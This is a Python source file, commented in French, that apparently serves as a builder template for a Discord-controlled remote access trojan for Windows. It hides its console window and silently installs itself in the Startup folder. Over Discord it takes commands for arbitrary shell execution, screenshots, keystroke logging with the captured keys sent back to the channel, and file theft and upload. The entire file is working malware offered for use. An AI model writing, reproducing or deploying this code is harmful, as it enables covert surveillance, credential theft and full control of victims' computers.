import os
import sys
import discord
from discord.ext import commands
import ctypes
import winreg as reg
import os
import subprocess
import threading

# Masquer la console
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
SW_HIDE = 0
hWnd = kernel32.GetConsoleWindow()
if hWnd:
    user32.ShowWindow(hWnd, SW_HIDE)

# Ajouter au démarrage
def add_to_startup():
    try:
        app_name = "DiscordBotApp"
        exe_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', f'{{app_name}}.lnk')
        
        if not os.path.exists(exe_path):
            script_path = sys.executable if getattr(sys, 'frozen', False) else __file__
            
            # Créer un raccourci dans le dossier de démarrage
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(exe_path)
            shortcut.Targetpath = script_path
            shortcut.WorkingDirectory = os.path.dirname(script_path)
            shortcut.save()
    except Exception as e:
        pass

add_to_startup()

# Configuration du bot
TOKEN = "{token}"
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="En arrière-plan"))
    print(f'Connecté en tant que {{bot.user.name}}')

@bot.command(name='helpme')
async def help_command(ctx):
    embed = discord.Embed(title="Commandes disponibles", description="Liste des commandes du bot", color=0x00ff00)
    embed.add_field(name="!info", value="Affiche des informations sur le bot", inline=False)
    embed.add_field(name="!shutdown", value="Éteint le bot", inline=False)
    embed.add_field(name="!restart", value="Redémarre le bot", inline=False)
    embed.add_field(name="!cmd [commande]", value="Exécute une commande système", inline=False)
    embed.add_field(name="!screenshot", value="Prend une capture d'écran", inline=False)
    embed.add_field(name="!keylogger [start/stop]", value="Démarre/arrête le keylogger", inline=False)
    embed.add_field(name="!download [fichier]", value="Télécharge un fichier", inline=False)
    embed.add_field(name="!upload", value="Téléverse un fichier", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='info')
async def info(ctx):
    embed = discord.Embed(title="Informations du Bot", color=0x00ff00)
    embed.add_field(name="Nom", value=bot.user.name, inline=True)
    embed.add_field(name="ID", value=bot.user.id, inline=True)
    embed.add_field(name="Serveurs", value=len(bot.guilds), inline=True)
    await ctx.send(embed=embed)

@bot.command(name='shutdown')
async def shutdown(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Extinction du bot...")
        await bot.close()
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

@bot.command(name='restart')
async def restart(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Redémarrage du bot...")
        python = sys.executable
        os.execl(python, python, *sys.argv)
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

@bot.command(name='cmd')
async def execute_cmd(ctx, *, command):
    if ctx.author.guild_permissions.administrator:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            await ctx.send(f"```\\n{{result[:1900]}}```")
        except subprocess.CalledProcessError as e:
            await ctx.send(f"```\\nErreur: {{e.output[:1900]}}```")
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

@bot.command(name='screenshot')
async def take_screenshot(ctx):
    if ctx.author.guild_permissions.administrator:
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            with open('screenshot.png', 'rb') as f:
                picture = discord.File(f)
                await ctx.send(file=picture)
            os.remove('screenshot.png')
        except Exception as e:
            await ctx.send(f"Erreur: {{str(e)}}")
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

keylogger_active = False
keylogs = []

@bot.command(name='keylogger')
async def keylogger_control(ctx, action: str):
    global keylogger_active
    if ctx.author.guild_permissions.administrator:
        if action.lower() == 'start':
            if not keylogger_active:
                keylogger_active = True
                threading.Thread(target=start_keylogger, daemon=True).start()
                await ctx.send("Keylogger démarré.")
            else:
                await ctx.send("Keylogger déjà en cours d'exécution.")
        elif action.lower() == 'stop':
            keylogger_active = False
            await ctx.send("Keylogger arrêté. Voici les logs:\\n```\\n{{'\\n'.join(keylogs)[:1900]}}```")
            keylogs.clear()
        else:
            await ctx.send("Usage: !keylogger [start/stop]")
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

def start_keylogger():
    from pynput import keyboard
    def on_press(key):
        if keylogger_active:
            try:
                keylogs.append(str(key.char))
            except AttributeError:
                if key == keyboard.Key.space:
                    keylogs.append(' ')
                else:
                    keylogs.append(f'[{{str(key)}}]')
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

@bot.command(name='download')
async def download_file(ctx, file_path: str):
    if ctx.author.guild_permissions.administrator:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    await ctx.send(file=discord.File(f))
            else:
                await ctx.send("Fichier non trouvé.")
        except Exception as e:
            await ctx.send(f"Erreur: {{str(e)}}")
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

@bot.command(name='upload')
async def upload_file(ctx):
    if ctx.author.guild_permissions.administrator:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                try:
                    await attachment.save(attachment.filename)
                    await ctx.send(f"Fichier {{attachment.filename}} téléversé avec succès.")
                except Exception as e:
                    await ctx.send(f"Erreur lors du téléversement: {{str(e)}}")
        else:
            await ctx.send("Aucun fichier attaché.")
    else:
        await ctx.send("Vous n'avez pas la permission d'utiliser cette commande.")

# Démarrer le bot
try:
    bot.run(TOKEN)
except Exception as e:
    pass
